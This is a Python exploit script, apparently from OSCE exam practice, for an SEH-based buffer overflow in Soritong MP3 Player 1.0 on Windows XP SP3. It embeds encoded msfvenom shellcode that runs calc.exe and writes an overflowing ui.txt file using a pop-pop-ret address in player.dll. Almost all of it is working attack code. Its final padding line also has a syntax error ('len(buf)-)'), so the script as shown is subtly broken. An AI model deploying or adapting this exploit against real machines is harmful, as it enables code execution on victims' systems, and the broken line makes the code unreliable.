#!/usr/bin/python 
# Soritong MP3 Player 1.0 Windows XP x86 SP3 exploit
# msfvenom -p windows/exec cmd=calc.exe -b "\x00\xcc" -a x86 -f python -e x86/alpha_mixed exitfunc=seh
buf =  ""
buf += "\x89\xe5\xdb\xd5\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x6a\x48\x6c"
buf += "\x42\x65\x50\x73\x30\x55\x50\x73\x50\x4b\x39\x48\x65"
buf += "\x50\x31\x49\x50\x72\x44\x4c\x4b\x62\x70\x66\x50\x4c"
buf += "\x4b\x33\x62\x34\x4c\x6c\x4b\x66\x32\x52\x34\x4c\x4b"
buf += "\x72\x52\x46\x48\x36\x6f\x6e\x57\x51\x5a\x31\x36\x75"
buf += "\x61\x69\x6f\x6e\x4c\x65\x6c\x43\x51\x31\x6c\x37\x72"
buf += "\x36\x4c\x65\x70\x49\x51\x6a\x6f\x56\x6d\x76\x61\x6b"
buf += "\x77\x39\x72\x6a\x52\x32\x72\x62\x77\x4e\x6b\x71\x42"
buf += "\x42\x30\x4e\x6b\x30\x4a\x77\x4c\x6c\x4b\x42\x6c\x54"
buf += "\x51\x31\x68\x58\x63\x77\x38\x53\x31\x4a\x71\x56\x31"
buf += "\x4e\x6b\x32\x79\x61\x30\x45\x51\x39\x43\x6e\x6b\x33"
buf += "\x79\x76\x78\x59\x73\x34\x7a\x77\x39\x6e\x6b\x75\x64"
buf += "\x4c\x4b\x43\x31\x39\x46\x34\x71\x4b\x4f\x4c\x6c\x6b"
buf += "\x71\x4a\x6f\x46\x6d\x45\x51\x4f\x37\x37\x48\x49\x70"
buf += "\x33\x45\x59\x66\x43\x33\x33\x4d\x6c\x38\x47\x4b\x51"
buf += "\x6d\x44\x64\x71\x65\x6d\x34\x63\x68\x4e\x6b\x32\x78"
buf += "\x56\x44\x43\x31\x4a\x73\x31\x76\x4e\x6b\x74\x4c\x70"
buf += "\x4b\x4c\x4b\x42\x78\x35\x4c\x35\x51\x6a\x73\x6e\x6b"
buf += "\x76\x64\x4e\x6b\x45\x51\x5a\x70\x6d\x59\x31\x54\x77"
buf += "\x54\x35\x74\x51\x4b\x63\x6b\x71\x71\x62\x79\x43\x6a"
buf += "\x32\x71\x59\x6f\x69\x70\x43\x6f\x43\x6f\x62\x7a\x4c"
buf += "\x4b\x54\x52\x78\x6b\x6e\x6d\x53\x6d\x30\x6a\x63\x31"
buf += "\x4e\x6d\x4f\x75\x6f\x42\x55\x50\x73\x30\x43\x30\x72"
buf += "\x70\x31\x78\x45\x61\x4c\x4b\x62\x4f\x6b\x37\x39\x6f"
buf += "\x78\x55\x4d\x6b\x6b\x4e\x56\x6e\x34\x72\x69\x7a\x51"
buf += "\x78\x4c\x66\x4d\x45\x4f\x4d\x6f\x6d\x79\x6f\x49\x45"
buf += "\x47\x4c\x57\x76\x31\x6c\x75\x5a\x4d\x50\x79\x6b\x49"
buf += "\x70\x54\x35\x56\x65\x4d\x6b\x72\x67\x46\x73\x64\x32"
buf += "\x30\x6f\x62\x4a\x33\x30\x63\x63\x6b\x4f\x4e\x35\x51"
buf += "\x73\x71\x71\x62\x4c\x61\x73\x36\x4e\x63\x55\x72\x58"
buf += "\x45\x35\x77\x70\x41\x41"

filename = "Z:\OSCE\ExtraMile\SoritongMP3Player1.0\ui.txt"
buffer = "A" * 584
buffer += "\xeb\x08\x90\x90" # JMP 
buffer += "\xdb\x41\x01\x10" # Pop pop rtn in player.dll 
buffer += "\x90" * 12 # NOPS
buffer += buf # Exploit
buffer += "C" * (5000-588-4-8-len(buf)-)
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
